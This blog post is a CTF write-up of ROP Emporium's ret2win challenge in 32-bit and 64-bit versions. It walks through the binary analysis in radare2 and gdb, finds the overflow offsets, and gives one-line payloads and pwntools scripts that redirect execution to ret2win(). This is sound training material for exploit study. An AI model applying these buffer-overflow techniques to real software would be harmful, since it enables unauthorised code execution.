---
layout: post
title: "Ret2win32"
author: "Trojan187"
categories: ctf
tags: [practice,learning]
image: ret2win.jpg
---


## Table of Contents

1. [Introduction](#introduction)
2. [Analysis](#analysis)
3. [Plan](#plan)
4. [Solution](#solution)
4. [64bit](#64bit)


##  Introduction

The challenge provides us with the binary.

HINT from: [!https://ropemporium.com/challenge/ret2win.html](https://ropemporium.com/challenge/ret2win.html)
As it states; you'll feed each binary with a quantity of garbage followed by your ROP chain. In this case there is a magic method we want to call and we'll do so by overwriting a saved return address on the stack. Certainly nothing that could be called a 'chain' by any stretch of the imagination but we've got to start somewhere. We'll do a little RE to confirm some information but nothing serious

---
### ROP-Emporium: ret2win32

_Files:_ `ret2win32`

---

##  Analysis

Lets take a look at the properties of the binary.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/checksec.PNG">

Using radare2 to analyze all referenced code.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/r2_aaaa.PNG">

Print the disassembly of the ret2win() function.
NOTE* `0x08048662` This looks very interesting and a potential address that can be used if the registers can be controlled. 

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/r2_pdf_ret2win.PNG">

Creating a pattern of 100 characters to use to locate the segmentation fault

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/gdb_start_pattern_create.PNG">

Segmentation fault occured and EIP was overwritten by 'AFAA' `0x41414641`. The offset is located at 44 bytes. 
EIP can now be controlled.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/gdb_EIP_Seg_fault.PNG">

##  Plan

The hint said there will not be chaining required, hmmm the solution may just be that simple. So I thought I would just input the address I noted `0x08048662` when disassembling the ret2win() function im `Image#3` above. 


```python

run <<< $(python -c 'print "A"*44 + "\x62\x86\x04\x08"')
```
Nice! It worked. 

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/gdb_flag.PNG">

And this is my final python script to exploit it.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win32/flag.PNG">

##  Solution
##  32bit

```python

#!/usr/bin/python
from pwn import *

context(arch='x86', os='linux', endian='little', word_size=32)

binary_path = './ret2win32'
e = ELF(binary_path)
p = process(binary_path)

buf = "A" * 44
buf += p32(0x08048662)

print(p.recvuntil('!\n'))
p.sendline(buf)
p.interactive()



```

## 64bit

The challenge provides us with the 64bit binary.

---
### ROP-Emporium: ret2win64

_Files:_ `ret2win`

---

### Analysis

Lets take a look at the properties of the binary.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/checksec.PNG">

Using radare2 to analyze all referenced code.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64//r2_aaaa_afl.PNG">

Print the disassembly of the ret2win() function.
NOTE* `0x00400815` This looks very interesting and a potential address that can be used if the registers can be controlled. 

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/r2_pdf_ret2win.PNG">

Creating a pattern of 100 characters to use to locate the segmentation fault

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/gdb_pattern_create.PNG">

Segmentation fault occured but this time RSP is holding 'AA0AAFAAb'. The offset is located at 40 bytes. 

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/gdb_seg_fault_offset.PNG">

### PLAN:

Same plan as the 32bit binary. Just input the address I noted `0x00400815` when disassembling the ret2win() function in `Image#3` above. 

```python
python -c 'print "A"*40+"\x15\x08\x40\x00\x00\x00\x00\x00\x00"' | ./ret2win
```
Nice! It worked. 

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/flag_1_line.PNG">

And this is my final python script to exploit it.

<img src="../../../../../assets/img/blogs/2020-04-21/ret2win64/flag.PNG">

```python

#!/usr/bin/python
from pwn import *

# 0x00400815 mov edi, str.Thank_you__Here_s_your_flag: ; 0x4009e0 ; "Thank you! Here's your flag:"

binary_path = './ret2win'
e = ELF(binary_path)
p = process(binary_path)

buf = "A" * 40

buf += p64(0x00400815)

print(p.recvuntil('!\n'))
p.sendline(buf)
p.interactive()



```



### END
---
